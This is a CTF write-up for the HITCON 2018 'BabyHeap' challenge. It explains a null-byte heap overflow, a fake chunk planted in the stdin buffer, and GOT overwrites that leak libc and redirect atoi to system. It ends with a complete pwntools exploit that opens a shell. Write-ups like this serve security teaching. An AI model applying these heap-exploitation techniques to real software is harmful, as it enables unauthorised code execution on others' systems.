---
title: BabyHeap - HITCON CTF 2018
date: 2019-01-07 13:00:00
categories:
  - Pwn
  - linux
  - heap
tags:
  - CTF
  - Writeup
  - Pwn
thumbnailImagePosition: right
---

Linux GLIBC Heap Exploitation of a null-byte overflow
<!-- excerpt -->

```
#########################
        Baby Heap
#########################
 1 . New
 2 . Delete
 3 . Edit
 4 . Exit
#########################
Your choice:
```

The program lets me create a structure in the heap. The structure goes like this

```c++
struct data {
	unsigned long size;
	char name[8];
	char * content;
}
```
I can also free and edit the structure, but each of these actions can be performed only once.

### Checksec
```bash
gdb-peda$ checksec
CANARY    : ENABLED
FORTIFY   : ENABLED
NX        : ENABLED
PIE       : disabled
RELRO     : Partial
```

### The vulnerability
The bug is quite straight forward, there is a **null byte overflow** when I enter the name, partially overwriting the content pointer on the structure.
```
gdb-peda$ x/10gx 0x00603000
0x603000:    0x0000000000000000    0x0000000000000021
0x603010:    0x0000000000000400    0x6262626262626262
0x603020:    0x0000000000603000    0x0000000000000411
0x603030:    0x6161616161616161    0x6161616161616161
0x603040:    0x6161616161616161    0x6161616161616161
```

I can see that the content pointer points to the structure, letting me overwrite the content pointer.
There is no view functionality that could possibly give us a leak, also PIE is disabled, so I am assuming we have to overwrite atoi() GOT entry with printf() to get libc leak.
But the above method requires me to use the Edit functionality twice, which is not possible, this got me stuck and thinking.

I was just going through the program memory, and I saw that there is only a stdout file structure pointer in .bss section. This means that stdin input will get buffered in the heap (You can see this is the program decompilation, but I didn't pay much attention to the init() function). 
Scanf() is being used only when you exit (the y/n option looked fishy in the first place).

The buffer chunk in heap is of size 0x1010, having the structure after this chunk looks good. 
```bash
gdb-peda$ x/16gx 0x00705000+0xfe0
0x705fe0:    0x6161616161616161    0x6161616161616161
0x705ff0:    0x0000000000000000    0x0000000000000211
0x706000:    0x0000000000000000    0x0000000000000000
0x706010:    0x0000000000000000    0x0000000000000021
0x706020:    0x0000000000000400    0x4242424242424242
0x706030:    0x0000000000706000    0x0000000000000411
0x706040:    0x4141414141414141    0x4141414141414141
0x706050:    0x4141414141414141    0x4141414141414141
```

In the previous scenario, the content pointer was pointing to the structure, calling the free() upon it would end up in an error as that pointer wasn't a valid chunk.

Now I can create ovelapping chunks in heap.
I create a fake chunk in the stdin buffer and free it, since content points to memory in the stdin buffer. I also place fake chunks appropriately so the sanity checks and double free corruption checks are bypassed.

Allocating the same chunk again, I have complete control over the structure. Now I can change the content pointer to a GOT address and later edit it.

Here's what I am going to do:
* Overwrite atoi() GOT with printf() PLT and get a libc leak.
* Overwrite aoit() GOT again with system() and get my shell. 

To accomplish this I need the "Edit" functionality more than once.
To bypass the one time edit constraint, I overwrite the exit() GOT with a ret ropgadget. 
Look at the dissassembly of the Edit:
```nasm
0x400b61:	push   rbp
0x400b62:	mov    rbp,rsp
0x400b65:	mov    rax,QWORD PTR [rip+0x201544]        
0x400b6c:	test   rax,rax
0x400b6f:	je     0x400b7b
0x400b71:	mov    eax,DWORD PTR [rip+0x20152d]        
0x400b77:	test   eax,eax
0x400b79:	je     0x400b8f
0x400b7b:	mov    edi,0x400e0a
0x400b80:	call   0x400760 <puts@plt>
0x400b85:	mov    edi,0x0
0x400b8a:	call   0x400740 <_exit@plt>     # A ret here will remove the constraint
0x400b8f:	mov    edi,0x400e19
0x400b94:	mov    eax,0x0
0x400b99:	call   0x400780 <printf@plt>
0x400b9e:	mov    rax,QWORD PTR [rip+0x20150b]        
0x400ba5:	mov    rax,QWORD PTR [rax]
0x400ba8:	mov    edx,eax
0x400baa:	mov    rax,QWORD PTR [rip+0x2014ff]        
0x400bb1:	mov    rax,QWORD PTR [rax+0x10]
0x400bb5:	mov    esi,edx
0x400bb7:	mov    rdi,rax
0x400bba:	call   0x400975
0x400bbf:	mov    eax,DWORD PTR [rip+0x2014df]        
0x400bc5:	add    eax,0x1
0x400bc8:	mov    DWORD PTR [rip+0x2014d6],eax        
0x400bce:	mov    edi,0x400e28
0x400bd3:	call   0x400760 <puts@plt>
0x400bd8:	nop
0x400bd9:	pop    rbp
0x400bda:	ret
```

I still can't change the content pointer in the structure, have to get to atoi() GOT from exit() GOT.

### Here is my exploit code
```python
from pwn import *

s=process("./babyheap",env={'LD_PRELOAD' : './libc.so.6'})
libc=ELF("./libc.so.6")


def new(size,content,name):
	s.sendlineafter("Your choice:",str(1))
	s.sendlineafter("Size :",str(size))
	s.sendlineafter("Content:",content)
	s.sendafter("Name:",name)

def remove():
	s.sendlineafter("Your choice:",str(2))

def edit(content,f=0):
	if(f==0):
		s.sendlineafter("Your choice:",str(3))
	else :
		s.sendlineafter("Your choice:",str(4))
	s.sendafter("Content:",content)

def exit(content):
	s.sendlineafter("Your choice:",str(4))
	s.sendafter("Really? (Y/n)",content)

def ed(content,ch=3):
	s.sendlineafter("Your choice:",str(ch))
	s.sendafter("Content:",content)

exit_got=0x602020
edit_addr=0x400b8f
ret=p64(0x0000000000400711)
free                =p64(0x400730)
exit_plt              =p64(0x400740)
read_chk          =p64(0x400756)
puts                =p64(0x400766)
stack_chk_fail    =p64(0x400776)
printf              =p64(0x400786)
alarm               =p64(0x400796)
read                =p64(0x4007a6)
libc_start_main   =p64(0x4007b6)
signal              =p64(0x4007c6)
malloc              =p64(0x4007d6)
setvbuf             =p64(0x4007e6)
atoi                =p64(0x4007f6)
scanf      =p64(0x400806)

# Creating a fake chunk in the stdin buffer.
exit("n".ljust(0x1000-0x20,"a") + p64(0x00) + p64(0x211))

# Creating a new structure and freeing the fake chunk.
new(0x400,"A"*0x1c0 + p64(0x00) + p64(0x21) + "a"*0x10 + p64(0x00) + p64(0x21),"B"*8)
remove()

# Allocating the fake chunk to changing the content pointer to exit() GOT in the structure.
new(0x200,"a"*0x10 + p64(0x00) + p64(0x21) + p64(0x200) + p64(0x00) +p64(exit_got) +p64(0x411),"b"*5)

# Editing exit() GOT with ret instruction.
edit("\x11\x07\x40")

# Editing atoi() GOT with printf() PLT to get libc leak.
ed(ret + read_chk + puts + stack_chk_fail + printf + alarm + read + libc_start_main + signal + malloc + setvbuf + printf + scanf)
s.sendlineafter("Your choice:","%p%p\n%p")
s.recvline()
libc_base=int(s.recvline(),16)-0x116cdc
log.info("LIBC_LEAK = " + hex(libc_base))
system = libc_base + libc.symbols['system']

# overwriting atoi() GOT with system() to get shell.
ed(ret + read_chk + puts + stack_chk_fail + printf + alarm + read + libc_start_main + signal + malloc + setvbuf + p64(system) + scanf,"11")
s.sendlineafter("Your choice:","/bin/sh")

s.interactive()
```
